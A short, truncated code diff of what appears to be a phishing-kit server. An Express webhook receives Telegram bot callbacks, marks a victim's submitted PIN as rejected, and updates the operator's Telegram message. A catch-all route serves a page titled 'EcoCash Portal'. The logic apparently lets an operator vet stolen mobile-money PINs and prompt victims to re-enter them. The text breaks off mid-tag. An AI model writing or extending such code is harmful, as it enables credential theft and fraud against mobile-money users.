@@ -430,7 +430,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'PIN_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌ (Redirected to re-enter PIN)</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -504,4 +504,5 @@ app.get('*', (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Page Not Found - EcoCa
+      <title>Page Not Found - EcoCash Portal</title>
+      <scri
